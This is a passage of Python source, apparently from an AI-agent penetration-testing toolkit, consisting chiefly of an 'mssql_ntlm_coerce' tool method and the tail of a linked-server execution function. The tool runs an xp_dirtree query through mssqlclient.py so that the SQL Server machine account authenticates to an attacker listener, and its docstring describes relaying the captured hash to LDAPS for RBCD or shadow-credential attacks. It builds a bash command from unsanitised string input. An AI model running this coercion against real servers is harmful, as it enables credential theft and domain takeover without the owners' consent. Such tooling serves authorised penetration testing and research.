                    "\u2192 Check for further linked servers to chain\n\n" + result
                )

            return result

        except Exception as e:
            return f"Linked server execution failed: {e}"

    @dn.tool_method
    def mssql_ntlm_coerce(
        self,
        target: str,
        username: str,
        password: str,
        listener_ip: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Coerce NTLM authentication from MSSQL server for relay attacks.

        Forces the SQL Server machine account to authenticate to your listener.
        Useful for relaying to LDAPS for RBCD or shadow credentials.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            listener_ip: Your listener IP (running Responder/ntlmrelayx)
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            Coercion attempt result

        Example:
            >>> mssql_ntlm_coerce("192.168.56.22", "user", "pass", "192.168.56.100", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest
        sql_query = f"EXEC xp_dirtree '\\\\\\\\{listener_ip}\\\\share';"

        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Coercing NTLM auth from {target} to {listener_ip}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            return (
                f"📋 MSSQL NTLM COERCION ATTEMPTED\n"
                f"\u2192 SQL Server should attempt to authenticate to {listener_ip}\n"
                "\u2192 Check your Responder/ntlmrelayx for captured auth\n"
                "\u2192 Machine account hash can be relayed to LDAPS\n\n" + result
            )

        except Exception as e:
            return f"MSSQL NTLM coercion failed: {e}"
